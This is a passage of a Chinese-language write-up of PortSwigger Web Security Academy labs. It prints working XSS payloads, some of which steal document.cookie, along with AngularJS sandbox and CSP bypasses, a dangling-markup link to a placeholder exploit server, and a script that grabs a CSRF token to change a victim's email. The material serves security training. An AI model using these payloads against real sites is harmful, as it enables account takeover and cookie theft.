+<p>重放这个csrf值试试 发现可以重复使用</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118193202140.png" alt="image-20221118193202140"></p>
+<p>尝试下</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> changeReq = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">changeReq.<span class="title function_">open</span>(<span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;/my-account/change-email&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">changeReq.<span class="title function_">send</span>(<span class="string">&#x27;csrf=bzRUdarVJuLrBhGd9L0WOELcXgBeGvXR&amp;email=123@test.com&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118194518882.png" alt="image-20221118194518882"></p>
+<p>可以执行 但是这里的 csrf 值有点局限性我们换一种写法</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    req.<span class="property">onload</span> = handleResponse;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//onload代表在xml执行完之后执行的代码</span></span></span><br><span class="line"><span class="language-javascript">    req.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;/my-account&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    req.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">handleResponse</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> token = <span class="variable language_">this</span>.<span class="property">responseText</span>.<span class="title function_">match</span>(<span class="regexp">/name=&quot;csrf&quot; value=&quot;(\w+)&quot;/</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 正则匹配出其中的csrf值</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> changeReq = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//发送新的请求去更改邮箱</span></span></span><br><span class="line"><span class="language-javascript">        changeReq.<span class="title function_">open</span>(<span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;/my-account/change-email&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">        changeReq.<span class="title function_">send</span>(<span class="string">&#x27;csrf=&#x27;</span> + token + <span class="string">&#x27;&amp;email=test@test.com&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118195140154.png" alt="image-20221118195140154"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118195151456.png" alt="image-20221118195151456"></p>
+<h2 id="XSS绕过waf-16"><a href="#XSS绕过waf-16" class="headerlink" title="XSS绕过waf(16)"></a>XSS绕过waf(16)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118195224366.png" alt="image-20221118195224366"></p>
+<p>这里存在xss但是也有waf过滤了标签</p>
+<p>尝试一下基础语法</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118203634438.png" alt="image-20221118203634438"></p>
+<p>这里返回的是标签不被允许</p>
+<p>尝试标签那个可以执行</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118204127552.png" alt="image-20221118204127552"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118204035210.png" alt="image-20221118204035210"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118204158374.png" alt="image-20221118204158374"></p>
+<p>只有两个标签可行</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118204244352.png" alt="image-20221118204244352"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118204640057.png" alt="image-20221118204640057"></p>
+<p>尝试属性 这里就复制第一个去尝试</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118204710099.png" alt="image-20221118204710099"></p>
+<p>这里重新标记</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118204750585.png" alt="image-20221118204750585"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118204836434.png" alt="image-20221118204836434"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118204939750.png" alt="image-20221118204939750"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118205059512.png" alt="image-20221118205059512"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onresize=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118205132369.png" alt="image-20221118205132369"></p>
+<p>当调整窗口大小的时候触发</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118205327033.png" alt="image-20221118205327033"></p>
+<p>书写payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://0aa200d50461d5b9c01b740a00220073.web-security-academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E&quot; onload=this.style.width=&#x27;100px&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118210230025.png" alt="image-20221118210230025"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118210246935.png" alt="image-20221118210246935"></p>
+<h2 id="XSS自定义标签-17"><a href="#XSS自定义标签-17" class="headerlink" title="XSS自定义标签(17)"></a>XSS自定义标签(17)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118212441277.png" alt="image-20221118212441277"></p>
+<p>这里翻了下发现个payload</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118213624936.png" alt="image-20221118213624936"></p>
+<p>我们直接查看payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;xss id=x onfocus=alert(document.cookie) tabindex=1&gt;#x</span><br></pre></td></tr></table></figure>
+
+<p>onfocus 代表当 光标聚焦到此标签的时候就会 执行js代码 而后面的 tabindex 表示该元素是可聚焦的 而最后的#x 则是与 id&#x3D;x 进行配合 id&#x3D;x 代表改标签的id是x  而#x 则是通过锚点聚焦到该标签上面 这样就能执行js代码了</p>
+<p>最终版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://0aed001303fc338ac0ba605f00080033.web-security-academy.net/?search=&lt;xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1&gt;#x&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118213926783.png" alt="image-20221118213926783"></p>
+<h2 id="SVG-标记的反射型-XSS-18"><a href="#SVG-标记的反射型-XSS-18" class="headerlink" title="SVG 标记的反射型 XSS(18)"></a>SVG 标记的反射型 XSS(18)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118215840886.png" alt="image-20221118215840886"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118220229463.png" alt="image-20221118220229463"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118215830422.png" alt="image-20221118215830422"></p>
+<p>可以看到有几个标签可行</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118222114133.png" alt="image-20221118222114133"></p>
+<p>拿过来尝试下属性</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118222254066.png" alt="image-20221118222254066"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221118222303209.png" alt="image-20221118222303209"></p>
+<p>拿过来直接试</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119111923282.png" alt="image-20221119111923282"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;&lt;animatetransform onbegin=alert(1) attributeName=transform&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119112005660.png" alt="image-20221119112005660"></p>
+<h2 id="在规范链接标签中反映-XSS-19"><a href="#在规范链接标签中反映-XSS-19" class="headerlink" title="在规范链接标签中反映 XSS(19)"></a>在规范链接标签中反映 XSS(19)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119132253873.png" alt="image-20221119132253873"></p>
+<p>这里好像是crome的特性</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;accesskey=&#x27;x&#x27;onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119132316008.png" alt="image-20221119132316008"></p>
+<h2 id="XSS-反射到-JavaScript-字符串中，并转义了单引号和反斜杠-20"><a href="#XSS-反射到-JavaScript-字符串中，并转义了单引号和反斜杠-20" class="headerlink" title="XSS 反射到 JavaScript 字符串中，并转义了单引号和反斜杠(20)"></a>XSS 反射到 JavaScript 字符串中，并转义了单引号和反斜杠(20)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119132424476.png" alt="image-20221119132424476"></p>
+<p>测试下 可以看到没有闭合标签 并且标签也没有转义</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119132617692.png"></p>
+<p>可以看到转义了’</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119132644785.png" alt="image-20221119132644785"></p>
+<p>可以看到转义了 \</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119132723913.png" alt="image-20221119132723913"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119132826691.png" alt="image-20221119132826691"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119132933376.png" alt="image-20221119132933376"></p>
+<h2 id="将-XSS-反射到带有尖括号和双引号的-JavaScript-字符串中-HTML-编码和单引号转义-21"><a href="#将-XSS-反射到带有尖括号和双引号的-JavaScript-字符串中-HTML-编码和单引号转义-21" class="headerlink" title="将 XSS 反射到带有尖括号和双引号的 JavaScript 字符串中 HTML 编码和单引号转义(21)"></a>将 XSS 反射到带有尖括号和双引号的 JavaScript 字符串中 HTML 编码和单引号转义(21)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119132957057.png" alt="image-20221119132957057"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119133610183.png" alt="image-20221119133610183"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119133806270.png" alt="image-20221119133806270"></p>
+<p>成功逃逸</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119133935364.png" alt="image-20221119133935364"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\&#x27;-alert(1)//</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119134021451.png" alt="image-20221119134021451"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119134040178.png" alt="image-20221119134040178"></p>
+<h2 id="使用尖括号和双引号将-XSS-存储到onclick事件中-HTML-编码和单引号和反斜杠转义-22"><a href="#使用尖括号和双引号将-XSS-存储到onclick事件中-HTML-编码和单引号和反斜杠转义-22" class="headerlink" title="使用尖括号和双引号将 XSS 存储到onclick事件中 HTML 编码和单引号和反斜杠转义(22)"></a>使用尖括号和双引号将 XSS 存储到onclick事件中 HTML 编码和单引号和反斜杠转义(22)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119134106069.png" alt="image-20221119134106069"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119134345915.png" alt="image-20221119134345915"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119134435086.png" alt="image-20221119134435086"></p>
+<p>这里尝试单引号闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;-alert(1)-&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119134813756.png" alt="image-20221119134813756"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119134819011.png" alt="image-20221119134819011"></p>
+<p>发现字符存在转义 那么这里我们可以进一步尝试一下 由于这个数据是从数据库中取出的 因此使用html编码进行尝试 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;apos;-alert(1)-&amp;apos;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119162502050.png" alt="image-20221119162502050"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119162708767.png" alt="image-20221119162708767"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119162631571.png" alt="image-20221119162631571"></p>
+<h2 id="将-XSS-反射到带有尖括号、单引号、双引号、反斜杠和反引号的模板文字中-Unicode-转义-23"><a href="#将-XSS-反射到带有尖括号、单引号、双引号、反斜杠和反引号的模板文字中-Unicode-转义-23" class="headerlink" title="将 XSS 反射到带有尖括号、单引号、双引号、反斜杠和反引号的模板文字中 Unicode 转义(23)"></a>将 XSS 反射到带有尖括号、单引号、双引号、反斜杠和反引号的模板文字中 Unicode 转义(23)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119163149141.png" alt="image-20221119163149141"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119164448123.png" alt="image-20221119164448123"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var message = `0 search results for &#x27;$&#123;alert(1)&#125;&#x27;`;</span><br></pre></td></tr></table></figure>
+
+<p>这里的 &#96;&#96; 其实就是代表可以使用模板语句的意思</p>
+<p>这里使用的 js 的模板语句  ${}里边是相当于js代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;alert(1)&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119163917496.png" alt="image-20221119163917496"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119165017127.png" alt="image-20221119165017127"></p>
+<h2 id="事件处理程序和href属性被阻止的反射型-XSS-24"><a href="#事件处理程序和href属性被阻止的反射型-XSS-24" class="headerlink" title="事件处理程序和href属性被阻止的反射型 XSS(24)"></a>事件处理程序和href属性被阻止的反射型 XSS(24)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119165146360.png" alt="image-20221119165146360"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119194353632.png" alt="image-20221119194353632"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119194338801.png" alt="image-20221119194338801"></p>
+<p>其中可以看到几个标签</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119194441662.png" alt="image-20221119194441662"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119195652626.png" alt="image-20221119195652626"></p>
+<p>查看这篇文章可以发现大致思路</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://portswigger.net/research/svg-animate-xss-vector</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119200334774.png" alt="image-20221119200334774"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values=javascript:alert(1) /&gt;&lt;text x=20 y=20&gt;Click me&lt;/text&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119171700514.png" alt="image-20221119171700514"></p>
+<h2 id="在-JavaScript-URL-中反映了-XSS，并阻止了一些字符-25"><a href="#在-JavaScript-URL-中反映了-XSS，并阻止了一些字符-25" class="headerlink" title="在 JavaScript URL 中反映了 XSS，并阻止了一些字符(25)"></a>在 JavaScript URL 中反映了 XSS，并阻止了一些字符(25)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119172216873.png" alt="image-20221119172216873"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119202120828.png" alt="image-20221119202120828"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221119202127750.png" alt="image-20221119202127750"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:fetch(&#x27;/analytics&#x27;, &#123;method:&#x27;post&#x27;,body:&#x27;/post%3fpostId%3d1&#x27;&#125;).finally(_ =&gt; window.location = &#x27;/&#x27;)&quot;&gt;Back to Blog&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里看到url中的 值在这里出现了</p>
+<p>简单试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/post?postId=1&amp;&#x27;1337</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221120210623291.png" alt="image-20221120210623291"></p>
+<p>这里可以看到我们填入的  ‘  被url编码了 那么你可能再想这里能执行吗</p>
+<p>简单尝试下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:fetch(&#x27;/analytics&#x27;, &#123;method:&#x27;post&#x27;,body:&#x27;/post%3fpostId%3d1%26%27-alert%281%29-%27&#x27;&#125;)</span><br><span class="line">.finally(_ =&gt; window.location = &#x27;/&#x27;)&quot;&gt;Back</span><br><span class="line">    to Blog&lt;/a&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221120211149797.png" alt="image-20221120211149797"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:fetch(&#x27;/analytics&#x27;, &#123;method:&#x27;post&#x27;,body:&#x27;/post%3fpostId%3d1%26&amp;#39;-alert%281%29-&amp;#39;&#x27;&#125;)</span><br><span class="line">.finally(_ =&gt; window.location = &#x27;/&#x27;)&quot;&gt;Back</span><br><span class="line">    to Blog&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221120211230867.png" alt="image-20221120211230867"></p>
+<p>两种方式都能弹 这里的原因是由于这段字符执行顺序是 html解码-&gt; url解码 -&gt; javascript解析</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/post?postId=1&amp;&#x27;-alert(1337)-&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到( )没了</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221120212329443.png" alt="image-20221120212329443"></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:fetch(&#x27;/analytics&#x27;, &#123;method:&#x27;post&#x27;,body:&#x27;/post%3fpostId%3d1%265&amp;&#x27;&#125;,</span></span><br><span class="line"><span class="string">x=x=&gt;&#123;</span></span><br><span class="line"><span class="string">&lt;!--=&gt; 使用匿名函数 --&gt;</span></span><br><span class="line"><span class="string">throw/**/onerror=alert,1337</span></span><br><span class="line"><span class="string">//抛出一个异常 弹出1337</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">,toString=x,window+&#x27;&#x27;,&#123;x:&#x27;&#x27;&#125;)</span></span><br><span class="line"><span class="string">//将x转换为字符串</span></span><br><span class="line"><span class="string">.finally(_ =&gt; window.location = &#x27;/&#x27;)&quot;</span>&gt;<span class="title class_">Back</span></span><br><span class="line">    to <span class="title class_">Blog</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看不太懂</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post?postId=5&amp;&#x27;&#125;,x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+&#x27;&#x27;,&#123;x:&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221120215257200.png" alt="image-20221120215257200"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221120215306403.png" alt="image-20221120215306403"></p>
+<h2 id="AngularJS-沙箱转义而不使用字符串的反射型-XSS-26"><a href="#AngularJS-沙箱转义而不使用字符串的反射型-XSS-26" class="headerlink" title="AngularJS 沙箱转义而不使用字符串的反射型 XSS(26)"></a>AngularJS 沙箱转义而不使用字符串的反射型 XSS(26)</h2><p>绕沙箱</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221120222501663.png" alt="image-20221120222501663"></p>
+<p>还是这个文章 看不太懂</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs#top</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221120222732468.png" alt="image-20221120222732468"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221120222724486.png" alt="image-20221120222724486"></p>
+<h2 id="使用-AngularJS-沙箱转义和-CSP-的反射-XSS-27"><a href="#使用-AngularJS-沙箱转义和-CSP-的反射-XSS-27" class="headerlink" title="使用 AngularJS 沙箱转义和 CSP 的反射 XSS(27)"></a>使用 AngularJS 沙箱转义和 CSP 的反射 XSS(27)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123175609179.png" alt="image-20221123175609179"></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">location=&#x27;https://0a9a002204540c3cc084a6a1005a00ac.web-security-academy.net/?search=<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">ng-focus</span>=<span class="string">$event.path|orderBy:</span>&#x27;(<span class="attr">z</span>=<span class="string">alert)(document.cookie)</span>&#x27;&gt;</span>#x&#x27;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到是通过 AngularJS 来绕过的csp机制</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input id=x ng-focus=$event.path|orderBy:&#x27;(z=alert)(document.cookie)&#x27;&gt;#x</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">location=<span class="string">&#x27;https://0a9a002204540c3cc084a6a1005a00ac.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123180106569.png" alt="image-20221123180106569"></p>
+<h2 id="CSP-保护的反射型-XSS，带有悬挂标记攻击-28"><a href="#CSP-保护的反射型-XSS，带有悬挂标记攻击-28" class="headerlink" title="CSP 保护的反射型 XSS，带有悬挂标记攻击(28)"></a>CSP 保护的反射型 XSS，带有悬挂标记攻击(28)</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123182514633.png" alt="image-20221123182514633"></p>
+<h3 id="悬挂标记攻击"><a href="#悬挂标记攻击" class="headerlink" title="悬挂标记攻击"></a>悬挂标记攻击</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://portswigger.net/web-security/cross-site-scripting/dangling-markup</span><br></pre></td></tr></table></figure>
+
+<p>这里有一个email参数 其中在页面上是有回显的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?email=1232132</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123195901297.png" alt="image-20221123195901297"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123195916477.png" alt="image-20221123195916477"></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/my-account/change-email&quot;</span> <span class="attr">class</span>=<span class="string">&quot;login-form&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">name</span>=<span class="string">&quot;change-email-form&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1232132&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;rWbiqj3aeSzjosrrn7qdqGzsdrPuNI9F&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&#x27;button&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span>&gt;</span> Update email<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可见这里的 value直接插入了 html中 我们尝试闭合一下 刚好这里也没有过滤 “&gt;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/my-account?email=1232132&quot;&gt;&lt;a+href%3d&quot;https%3a//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&quot;&gt;Click+me&lt;/a&gt;&lt;base+target%3d</span><br></pre></td></tr></table></figure>
+
+<p>这样一构造就变成了  值了</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221123200620453.png" alt="image-20221123200620453"></p>
+<h3 id="window-name跨域"><a href="#window-name跨域" class="headerlink" title="window.name跨域"></a>window.name跨域</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.cnblogs.com/Walker-lyl/p/7454522.html</span><br></pre></td></tr></table></figure>
+
+<h3 id="js中几种实用的跨域方法原理详解"><a href="#js中几种实用的跨域方法原理详解" class="headerlink" title="js中几种实用的跨域方法原理详解"></a>js中几种实用的跨域方法原理详解</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.cnblogs.com/fliu/articles/5249130.html</span><br></pre></td></tr></table></figure>
+
+<p>我们来看下官方的构造方法</p>
